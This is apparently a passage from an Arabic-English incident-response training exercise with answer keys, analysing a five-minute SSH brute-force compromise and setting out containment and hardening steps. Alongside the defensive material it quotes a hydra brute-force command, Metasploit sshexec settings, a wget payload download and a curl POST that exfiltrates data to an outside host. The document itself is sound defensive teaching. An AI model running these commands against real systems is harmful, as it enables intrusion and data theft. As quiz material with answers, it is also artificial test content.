curl http://example.com/file.txt

# Upload (POST)
curl -X POST -F "file=@localfile.txt" http://example.com/upload

# Custom headers
curl -H "Authorization: Bearer token" http://api.example.com

# Multiple protocols
curl ftp://ftp.example.com/file.txt
curl scp://user@host/file.txt
```

**vs wget:**
```
wget: Better for downloads
curl: Better for uploads/APIs
```

**HTTP POST Upload:**
```
Method: POST
Content-Type: multipart/form-data
Field: file
Data: @/tmp/logs_backup.tar.gz (binary file)
Destination: http://185.122.21.55/upload
```

---

#### Q17: Attack Success Factors

**السؤال:** ما الذي سمح بنجاح الهجوم؟ (اختر كل ما ينطبق)

**الخيارات:**
- Weak password
- Sudo misconfiguration
- No rate limiting on SSH
- Firewall allowed outbound HTTP

**الإجابة:** **كلهم** ✅

**التفسير:**

**1. Weak Password:**
```
Username: developer
Password: Dev@2023 (أو مشابه)

Problems:
❌ Dictionary word ("Dev")
❌ Predictable pattern
❌ Short length
❌ No complexity

Should Be:
✓ 16+ characters
✓ Random: X9$mK2#pQ8@nL4*W
✓ Unique per account
✓ Managed by password manager
```

**2. Sudo Misconfiguration:**
```bash
# WRONG:
developer ALL=(ALL:ALL) ALL

# CORRECT:
# No sudo for developer
# OR specific commands only
```

**3. No Rate Limiting:**
```
Current:
- 37 attempts in 54 seconds
- No account lockout
- No temporary ban

Should Have:
- MaxAuthTries 3 (SSH config)
- fail2ban (auto-ban after failures)
- Account lockout policies
```

**4. Firewall Allowed Outbound:**
```
Problem:
[FIREWALL] ALLOW TCP 203.0.113.50 -> 185.122.21.55:80

Should:
- Block outbound to untrusted IPs
- Whitelist-only approach
- DPI (Deep Packet Inspection)
```

**Defense in Depth:**
```
If ANY ONE was fixed:
✓ Strong password → Brute-force fails
✓ No sudo → Can't escalate
✓ Rate limiting → Brute-force too slow
✓ Firewall block → Can't exfiltrate

All 4 failed = Complete compromise
```

---

#### Q18: Primary Impact

**السؤال:** ما هو الـ primary impact؟

**الخيارات:**
- Data confidentiality breach
- Service availability loss
- Data integrity compromise
- Website defacement

**الإجابة:** `Data confidentiality breach`

**التفسير:**

**CIA Triad Analysis:**

**Confidentiality:** ❌ **BREACHED**
```
Stolen Data:
- System logs
- User accounts (/etc/passwd)
- Password hashes (/etc/shadow)
- Database credentials
- SSH keys
- Application configs

Impact:
- Sensitive data exposed
- Credentials compromised
- Further attacks possible
```

**Integrity:** ✅ **MOSTLY INTACT**
```
- No file modifications detected
- No backdoors created (in logs)
- Data not tampered
- System configs unchanged
```

**Availability:** ✅ **INTACT**
```
- Server still running
- Services operational
- No DoS attack
- No ransomware
```

**Why Confidentiality؟**
```
Attacker's goal: STEAL data
Not: Destroy or disrupt

Method:
1. Access system ✓
2. Escalate privileges ✓
3. Collect sensitive files ✓
4. Exfiltrate ✓
5. Leave no trace (almost)
```

---

### Phase 2: Incident Investigation (8 أسئلة)

#### Q1: Attack Pattern

**السؤال:** ما نمط الهجوم الكامل؟

**الإجابة:** `SSH brute-force` / `SSH attack` / `Brute force` / `Credential attack` / `SSH compromise`

**التفسير:**

**Complete Attack Chain:**
```
1. Reconnaissance
   ↓
2. SSH Brute-Force (Initial Access)
   ↓
3. Successful Login
   ↓
4. Privilege Escalation
   ↓
5. Malware Download
   ↓
6. Malware Execution
   ↓
7. Data Collection
   ↓
8. Data Exfiltration
```

**Core Attack Method:** **SSH Brute-Force**
- Everything started from brute-forcing SSH
- Without successful brute-force, no compromise

---

#### Q2: Attack Duration

**السؤال:** كم استغرق الهجوم الكامل (من first attempt إلى exfiltration)؟

**الخيارات:**
- Less than 5 minutes
- 5-10 minutes
- 10-30 minutes
- Over 1 hour

**الإجابة:** `Less than 5 minutes` (actually: **5 minutes 9 seconds**)

**التفصيل:**
```
Start:  08:15:21 (first brute-force attempt)
End:    08:18:30 (data exfiltration complete)
Total:  5 minutes 9 seconds
```

**Breakdown:**
```
Phase 1: Brute-Force (54 sec)
  08:15:21 → 08:16:15

Phase 2: Privilege Escalation (60 sec)
  08:16:15 → 08:17:15

Phase 3: Malware Download (3 sec)
  08:17:15 → 08:18:02 (wait)
  08:18:02 → 08:18:05 (actual download)

Phase 4: Execution + Exfiltration (25 sec)
  08:18:05 → 08:18:30
```

**Why So Fast؟**

1. **Automated Tools:**
   - Brute-force: Hydra (37 attempts/54 sec)
   - Exploitation: Pre-written scripts
   - Exfiltration: Automated malware

2. **Weak Defenses:**
   - No rate limiting (fast brute-force)
   - Sudo misconfiguration (instant escalation)
   - No outbound filtering (easy exfiltration)

3. **Attacker Experience:**
   - Pre-prepared payload.sh
   - Knew exactly what to do
   - Efficient execution

**Comparison:**
```
This Attack: 5 minutes (very fast!)
Average Ransomware: 2-3 days (reconnaissance + lateral movement)
Average APT: Weeks/months (stealth + persistence)
```

---

#### Q3: Evidence of Automation

**السؤال:** ما الدليل على أن الهجوم automated؟

**الخيارات:**
- 37 login attempts in under 1 minute
- Sequential username patterns
- No delays between commands
- All of the above

**الإجابة:** `All of the above`

**التفصيل:**

**1. High-Speed Attempts:**
```
37 attempts / 54 seconds = 41 attempts/minute = 0.7 attempts/second

Human typing speed: ~5-10 seconds per attempt
Automated tool: 0.7 seconds per attempt

Conclusion: AUTOMATED (Hydra, Medusa, Patator)
```

**2. Sequential Patterns:**
```
Attempts follow wordlist order:
  admin
  root
  test
  user
  developer
  ...

Human would try:
  root
  admin123
  password
  (random guesses)

Bot uses:
  Dictionary file (rockyou.txt, common_passwords.txt)
  Systematic approach
```

**3. No Delays:**
```
Post-Compromise Timeline:
08:16:15 - Login success
08:17:15 - Privilege escalation (exactly 60 sec later)
08:18:02 - Malware download (exactly 47 sec later)
08:18:05 - Execution (exactly 3 sec later)
08:18:30 - Exfiltration (exactly 25 sec later)

Precision timing = Scripted!
```

**Automated Tools Used:**

**Brute-Force:**
```bash
hydra -L usernames.txt -P passwords.txt ssh://203.0.113.50 -t 16
```

**Post-Exploitation Framework:**
```bash
# Metasploit-style automation
use exploit/multi/ssh/sshexec
set RHOSTS 203.0.113.50
set USERNAME developer
set PASSWORD Dev@2023
exploit
```

---

#### Q4: MITRE ATT&CK Techniques (Select ALL)

**السؤال:** أي techniques تنطبق على الهجوم؟

**الخيارات:**
- T1110 – Brute Force
- T1548.003 – Sudo and Sudo Caching
- T1105 – Ingress Tool Transfer
- T1041 – Exfiltration Over C2

**الإجابة:** **جميعهم** ✅

**التفصيل:**

**T1110 - Brute Force:**
```
Phase: Initial Access
Time: 08:15:21 - 08:16:15
Evidence: 37 failed + 1 successful SSH login
Tool: Hydra/Medusa
```

**T1548.003 - Sudo and Sudo Caching:**
```
Phase: Privilege Escalation
Time: 08:17:15
Evidence: "sudo: session opened for user root by developer"
Method: sudo su (misconfigured sudoers)
```

**T1105 - Ingress Tool Transfer:**
```
Phase: Malware Deployment
Time: 08:18:02
Evidence: "wget http://185.122.21.55/payload.sh"
Tool Transferred: payload.sh (malicious script)
```

**T1041 - Exfiltration Over C2:**
```
Phase: Data Theft
Time: 08:18:30
Evidence: "curl -X POST ... http://185.122.21.55/upload"
Data Exfiltrated: logs_backup.tar.gz (2.5 MB)
```

**Additional Techniques:**

**T1059.004 - Unix Shell:**
```
All commands executed via bash shell
```

**T1078 - Valid Accounts:**
```
After brute-force success, used developer account
```

**T1071.001 - Web Protocols:**
```
HTTP for malware download & data exfiltration
```

**Complete MITRE Mapping:**
```
Initial Access:
  └─► T1078 (Valid Accounts - after brute-force)

Execution:
  └─► T1059.004 (Unix Shell)

Persistence:
  └─► (None detected in this attack)

Privilege Escalation:
  └─► T1548.003 (Sudo)

Defense Evasion:
  └─► T1070.004 (File Deletion - likely)

Credential Access:
  └─► T1110 (Brute Force)

Discovery:
  └─► T1033 (System Owner/User Discovery)

Lateral Movement:
  └─► (None in this scenario)

Collection:
  └─► T1560 (Archive Collected Data)

Command and Control:
  └─► T1071.001 (Web Protocols)

Exfiltration:
  └─► T1041 (Exfiltration Over C2)
  └─► T1048 (Exfiltration Over Alternative Protocol)

Impact:
  └─► (None - no destruction)
```

---

#### Q5: Primary Vulnerability

**السؤال:** ما الثغرة الأساسية التي سمحت بالهجوم؟

**الخيارات:**
- SQL injection
- Weak SSH password
- Unpatched software
- Missing firewall

**الإجابة:** `Weak SSH password`

**التفصيل:**

**Why Weak Password؟**

**Root Cause:**
```
Username: developer
Password: Dev@2023 (estimated)

Problems:
❌ Dictionary-based (Dev = common word)
❌ Predictable pattern (word + year)
❌ Only 8 characters
❌ In brute-force wordlists
```

**Without Weak Password:**
```
Strong Password: X9$mK2#pQ8@nL4*W7&b

Brute-Force Result:
- Would take YEARS instead of seconds
- Attacker would give up
- Attack would fail at step 1
```

**Comparison:**

**Current Scenario:**
```
Attempts: 37
Time: 54 seconds
Result: SUCCESS (password found)
```

**With Strong Password:**
```
Attempts: 37
Time: 54 seconds
Result: FAILURE (password not in wordlist)

Extended Attack:
Attempts: 10,000,000+
Time: Days/weeks/months
Result: Still likely FAILURE
```

---

**لماذا ليس الخيارات الأخرى؟**

**SQL Injection:**
```
Target: SSH server (not web app)
Protocol: SSH (not HTTP)
Vulnerability Type: Credential weakness (not code injection)
Result: NOT APPLICABLE
```

**Unpatched Software:**
```
SSH Version: OpenSSH 7.4 (in example)
Vulnerability: Not exploited (no CVE used)
Method: Brute-force (works on any version)
Result: NOT THE PRIMARY ISSUE
```

**Missing Firewall:**
```
Firewall Status: EXISTS (allowed outbound HTTP)
Issue: Misconfigured (not missing)
Impact: Helped exfiltration (not initial access)
Result: SECONDARY ISSUE
```

**Defense Layers:**
```
Layer 1: Strong Password ← FAILED (weak password)
Layer 2: Rate Limiting   ← FAILED (no limit)
Layer 3: Account Lockout ← FAILED (no lockout)
Layer 4: SSH Keys Only   ← FAILED (password auth allowed)
Layer 5: 2FA             ← FAILED (no MFA)

All layers failed!
```

---

#### Q6: Recommended Immediate Action

**السؤال:** ما أول إجراء يجب اتخاذه؟

**الخيارات:**
- Disable compromised account
- Scan for malware
- Update all passwords
- Block attacker IP

**الإجابة:** `Disable compromised account` **أو** `Block attacker IP`

**كلاهما صحيح، لكن Priority:**

**#1 Priority: Block Attacker IP**
```bash
# Immediate - stops ongoing attack
iptables -A INPUT -s 185.122.21.55 -j DROP
firewall-cmd --add-rich-rule='rule family="ipv4" source address="185.122.21.55" reject'
```

**Why First؟**
- Attacker may still have active session
- Prevents re-connection
- Stops further data theft
- **CONTAINS THE BREACH**

**#2 Priority: Disable Account**
```bash
# Stops attacker from re-authenticating
usermod -L developer  # Lock account
passwd -l developer   # Lock password
```

**Why Second؟**
- Terminates existing sessions
- Prevents credential reuse
- **REMOVES ACCESS**

---

**Complete Incident Response:**

**Phase 1: Containment (Minutes)** ⏱️ **0-15 min**
```
1. Block attacker IP (185.122.21.55)
   iptables -A INPUT -s 185.122.21.55 -j DROP

2. Disable developer account
   usermod -L developer

3. Kill active SSH sessions
   pkill -9 -u developer
   who -u | grep developer | awk '{print $6}' | xargs kill -9

4. Disable SSH temporarily (if possible)
   systemctl stop sshd
   
5. Enable firewall strict mode
   # Block all except essential
```

**Phase 2: Investigation (Hours)** ⏱️ **1-4 hours**
```
1. Review logs
   - /var/log/auth.log (SSH attempts)
   - /var/log/syslog (system events)
   - /var/log/secure (authentication)

2. Check for backdoors
   - Cron jobs: crontab -l -u root
   - Startup scripts: ls /etc/rc*.d/
   - New users: cat /etc/passwd

3. Identify exfiltrated data
   - What was in logs_backup.tar.gz?
   - Which credentials compromised?

4. File integrity check
   - aide --check
   - rpm -Va (RPM-based)
```

**Phase 3: Eradication (Hours)** ⏱️ **4-8 hours**
```
1. Remove malware
   rm /tmp/payload.sh
   rm /tmp/logs_backup.tar.gz

2. Fix sudo misconfiguration
   visudo
   # Remove: developer ALL=(ALL:ALL) ALL

3. Enforce strong passwords
   # /etc/security/pwquality.conf
   minlen = 16
   dcredit = -1  # At least 1 digit
   ucredit = -1  # At least 1 uppercase
   ocredit = -1  # At least 1 special char

4. Enable rate limiting
   # Install fail2ban
   apt install fail2ban
   
   # /etc/fail2ban/jail.local
   [sshd]
   enabled = true
   maxretry = 3
   bantime = 3600
```

**Phase 4: Recovery (Days)** ⏱️ **1-7 days**
```
1. Change ALL passwords
   - Root password
   - All user passwords
   - Database passwords
   - API keys

2. Rotate SSH keys
   ssh-keygen -t ed25519 -C "new-key-2024"

3. Update software
   apt update && apt upgrade

4. Harden SSH
   # /etc/ssh/sshd_config
   PermitRootLogin no
   PasswordAuthentication no
   PubkeyAuthentication yes
   MaxAuthTries 3
   AllowUsers admin@192.168.1.0/24
   
5. Restore from clean backup (if available)
```

**Phase 5: Lessons Learned (Weeks)** ⏱️ **7-30 days**
```
1. Post-incident review
2. Update security policies
3. Implement monitoring
4. Security awareness training
5. Penetration testing
```

---

#### Q7: Sudo Misconfiguration Fix

**السؤال:** كيف تمنع privilege escalation؟

**الخيارات:**
- Remove user from sudoers
- Require password for sudo
- Limit sudo to specific commands
- All of the above

**الإجابة:** `All of the above` (لكن #1 و #3 الأهم)

**التفصيل:**

**Current Misconfiguration:**
```bash
# /etc/sudoers
developer ALL=(ALL:ALL) ALL
```

**Fix Option 1: Remove Completely**
```bash
# /etc/sudoers
# developer ALL=(ALL:ALL) ALL  ← Comment out or delete

# Remove from sudo group
deluser developer sudo
```

**When to Use:**
- Developer doesn't need admin tasks
- Separation of duties principle
- **Most Secure**

---

**Fix Option 2: Specific Commands Only**
```bash
# /etc/sudoers
# Allow only specific commands
developer ALL=(ALL) NOPASSWD:/usr/bin/systemctl restart nginx
developer ALL=(ALL) NOPASSWD:/usr/bin/systemctl status nginx
developer ALL=(ALL) NOPASSWD:/usr/bin/docker ps
developer ALL=(ALL) NOPASSWD:/usr/bin/docker logs *

# NO wildcard sudo!
# NO /bin/bash, /bin/sh allowed!
```

**Benefits:**
- Developer can do job tasks
- Can't escalate to full root
- **Principle of Least Privilege**

---

**Fix Option 3: Require Password**
```bash
# /etc/sudoers
# Remove NOPASSWD if it exists
developer ALL=(ALL) /usr/sbin/service nginx restart

# This requires developer password each time
```

**Limitations:**
```
❌ Attacker already has password (from brute-force)
❌ Doesn't prevent escalation
✓ Adds logging
✓ Requires explicit action
```

---

**Best Practice Configuration:**

**For Regular Users:**
```bash
# NO sudo access
# (remove from sudoers completely)
```

**For DevOps/Admins:**
```bash
# Specific commands only
devops ALL=(ALL) NOPASSWD:/usr/bin/systemctl restart apache2
devops ALL=(ALL) NOPASSWD:/usr/bin/systemctl reload nginx
devops ALL=(ALL) /usr/bin/apt update
devops ALL=(ALL) /usr/bin/apt upgrade

# With password required
admin ALL=(ALL) /usr/sbin/*

# Time-limited sudo caching
Defaults timestamp_timeout=5  # 5 minutes
```

**For Root Tasks:**
```bash
# Use dedicated admin account
# Never give regular users full sudo
```

**Audit sudo Usage:**
```bash
# /etc/sudoers
Defaults log_output
Defaults!/usr/bin/sudoreplay !log_output
Defaults!/sbin/reboot !log_output

# Review logs
cat /var/log/sudo.log
journalctl SYSLOG_IDENTIFIER=sudo
```

---

#### Q8: Long-term Prevention

**السؤال:** أي إجراءات تمنع هجمات مستقبلية؟ (اختر كل ما ينطبق)

**الخيارات:**
- Implement SSH key authentication
- Enable fail2ban
- Use strong password policy
- Disable password authentication
- Implement 2FA
- Regular security audits

**الإجابة:** **جميعهم** ✅

**التفصيل:**

**1. SSH Key Authentication:**
```bash
# Generate key pair
ssh-keygen -t ed25519 -C "user@example.com"

# Copy public key to server
ssh-copy-id user@server

# /etc/ssh/sshd_config
PubkeyAuthentication yes
```

**Benefits:**
```
✓ No password to brute-force
✓ 256-bit security (ed25519)
✓ Impossible to guess
✓ Can be hardware-backed (YubiKey)
```

**Attack Impact:**
```
Before: 37 attempts → SUCCESS
After:  ∞ attempts → FAILURE (no password to find)
```

---

**2. Fail2Ban:**
```bash
# Install
apt install fail2ban

# /etc/fail2ban/jail.local
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
findtime = 600
bantime = 3600
```

**How It Works:**
```
Attempt #1: Failed → Log
Attempt #2: Failed → Log
Attempt #3: Failed → Log + BAN IP for 1 hour!
Attempt #4: BLOCKED by firewall

After 1 hour:
Attempts reset, IP unbanned
```

**Attack Impact:**
```
Before: 37 attempts in 54 seconds
After:  3 attempts → IP BANNED → Attack stopped!
```

---

**3. Strong Password Policy:**
```bash
# /etc/security/pwquality.conf
minlen = 16        # Minimum 16 characters
dcredit = -1       # At least 1 digit
ucredit = -1       # At least 1 uppercase
lcredit = -1       # At least 1 lowercase
ocredit = -1       # At least 1 special character
difok = 8          # At least 8 different chars from old password
enforce_for_root   # Apply to root too
```

**Password Examples:**
```
❌ Bad:  Dev@2023 (8 chars, predictable)
✓ Good: X9$mK2#pQ8@nL4*W (16 chars, random)

Brute-Force Time:
Bad:  Minutes
Good: Billions of years
```

**Enforcement:**
```bash
# Force password change
passwd -e developer  # Expire password

# Check password strength
echo "Dev@2023" | pwscore
# Output: 45 (weak!)

echo "X9$mK2#pQ8@nL4*W" | pwscore
# Output: 100 (strong!)
```

---

**4. Disable Password Authentication:**
```bash
# /etc/ssh/sshd_config
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes

# Restart SSH
systemctl restart sshd
```

**Impact:**
```
Brute-Force Attack:
  Before: Can try passwords
  After:  Password auth disabled → Attack fails immediately!
```

**Requirement:**
```
Must have SSH keys set up first!
Otherwise you'll lock yourself out!
```

---

**5. Two-Factor Authentication (2FA):**
```bash
# Install Google Authenticator
apt install libpam-google-authenticator

# Configure for user
su - developer
google-authenticator

# /etc/pam.d/sshd
auth required pam_google_authenticator.so

# /etc/ssh/sshd_config
ChallengeResponseAuthentication yes
AuthenticationMethods publickey,keyboard-interactive
```

**Login Flow:**
```
1. SSH Key (something you have)
   +
2. OTP Code (something you know)
   =
   Access Granted
```

**Attack Impact:**
```
Even if attacker has:
✓ SSH key (stolen)
✓ Password (brute-forced)

Still can't login without:
✗ Current OTP code (changes every 30 seconds)
```

---

**6. Regular Security Audits:**

**Weekly Checks:**
```bash
# Check failed SSH attempts
grep "Failed password" /var/log/auth.log | tail -20

# Check sudo usage
grep sudo /var/log/auth.log | tail -20

# Check new users
diff <(cat /etc/passwd) <(cat /backup/passwd)

# Check listening services
ss -tulpn | grep LISTEN
```

**Monthly Audits:**
```bash
# Review sudoers
cat /etc/sudoers
cat /etc/sudoers.d/*

# Check cron jobs
crontab -l -u root
ls -la /etc/cron.*

# File integrity
aide --check

# Package verification
debsums -c  # Debian
rpm -Va     # RHEL
```

**Quarterly Penetration Testing:**
```
- External vulnerability scan
- Internal penetration test
- Social engineering assessment
- Code review
```

**Automation:**
```bash
# Daily monitoring script
#!/bin/bash
# /usr/local/bin/security-check.sh

# Check for brute-force attempts
ATTEMPTS=$(grep "Failed password" /var/log/auth.log | grep "$(date +%Y-%m-%d)" | wc -l)
if [ $ATTEMPTS -gt 10 ]; then
    echo "ALERT: $ATTEMPTS failed SSH attempts today!" | mail -s "Security Alert" admin@example.com
fi

# Check for new sudo users
NEW_SUDO=$(grep sudo /etc/group | cut -d: -f4)
if [ "$NEW_SUDO" != "$EXPECTED_SUDO" ]; then
    echo "ALERT: Sudo group modified!" | mail -s "Security Alert" admin@example.com
fi

# Run via cron
# 0 * * * * /usr/local/bin/security-check.sh
```

---

## 📝 الملخص النهائي

### Attack Summary:

**Complete Timeline:**
```
Duration: 5 minutes 9 seconds
Success: FULL COMPROMISE
Impact: HIGH (data breach, credentials stolen)
```

**Attack Chain:**
```
1. Reconnaissance      → Found SSH port 22 open
2. Brute-Force (54s)   → 37 attempts → developer:Dev@2023
3. Login Success       → SSH access granted
4. Privilege Escalation (60s) → sudo su → root access
5. Malware Download (3s)      → wget payload.sh
6. Malware Execution   → chmod +x && execute
7. Data Collection     → Archive /var/log, /etc/passwd, etc.
8. Exfiltration (25s)  → curl upload to attacker server
```

---

### MITRE ATT&CK Complete Mapping:

| Phase | Technique | Evidence |
|-------|-----------|----------|
| **Initial Access** | T1078 - Valid Accounts | SSH login as developer |
| **Execution** | T1059.004 - Unix Shell | Bash commands |
| **Persistence** | (None detected) | No backdoors in logs |
| **Privilege Escalation** | T1548.003 - Sudo | sudo su to root |
| **Defense Evasion** | T1070 - Indicator Removal | Likely deleted logs |
| **Credential Access** | T1110 - Brute Force | 37 failed SSH attempts |
| **Discovery** | T1033 - System Owner/User Discovery | whoami, id commands |
| **Collection** | T1560 - Archive Collected Data | tar logs_backup.tar.gz |
| **C2** | T1071.001 - Web Protocols | HTTP to 185.122.21.55 |
| **Exfiltration** | T1041 - Exfiltration Over C2 | curl POST file upload |

---

### Vulnerabilities Exploited:

```
┌─────────────────────────┬─────────────┬──────────────────┐
│ Vulnerability           │ Severity    │ Impact           │
├─────────────────────────┼─────────────┼──────────────────┤
│ Weak Password           │ CRITICAL    │ Initial Access   │
│ Sudo Misconfiguration   │ CRITICAL    │ Root Compromise  │
│ No Rate Limiting        │ HIGH        │ Fast Brute-Force │
│ No Account Lockout      │ HIGH        │ Unlimited Tries  │
│ Password Auth Enabled   │ MEDIUM      │ Brute-Force Risk │
│ No 2FA                  │ MEDIUM      │ Single Factor    │
│ Firewall Misconfigured  │ MEDIUM      │ Data Exfiltration│
└─────────────────────────┴─────────────┴──────────────────┘
```

---

### Recommended Mitigations:

**Immediate (Day 1):**
- [ ] Block attacker IP: 185.122.21.55
- [ ] Disable developer account
- [ ] Change all passwords
- [ ] Fix sudo configuration
- [ ] Install fail2ban

**Short-term (Week 1):**
- [ ] Implement SSH key authentication
- [ ] Disable password authentication
- [ ] Enable 2FA
- [ ] Audit all user accounts
- [ ] Review firewall rules

**Long-term (Month 1):**
- [ ] Regular security audits
- [ ] Penetration testing
- [ ] SIEM implementation
- [ ] Incident response plan
- [ ] Security awareness training

---

### Key Lessons:

1. **Defense in Depth:** Multiple layers needed
   - Password strength
   - Rate limiting
   - Account lockout
   - SSH keys
   - 2FA
   - Monitoring

2. **Least Privilege:** Don't give sudo to everyone
   - Regular users: No sudo
   - DevOps: Specific commands only
   - Admins: Separate privileged accounts

3. **Monitor & Respond:** Fast detection = less damage
   - Brute-force detected in seconds
   - Auto-block with fail2ban
   - Alert SOC team
   - Investigate immediately

4. **Harden SSH:** Most attacked service
   - SSH keys only (no passwords)
   - Change default port (22 → random)
   - Limit user access
   - Enable 2FA
   - Rate limiting

---

**النتيجة:** هجوم سريع ومدمر نجح بسبب ضعف في عدة مستويات دفاعية. التطبيق الصحيح لـ best practices كان سيمنع الهجوم تماماً.

---

## 🎯 نهاية السيناريو

**تذكر:**
- SSH brute-force attacks شائعة جداً (ملايين يومياً)
- الحماية سهلة: SSH keys + fail2ban + strong passwords
- 5 دقائق كانت كافية للمهاجم لسرقة كل شيء
- **اعمل hardening قبل ما يكون too late!**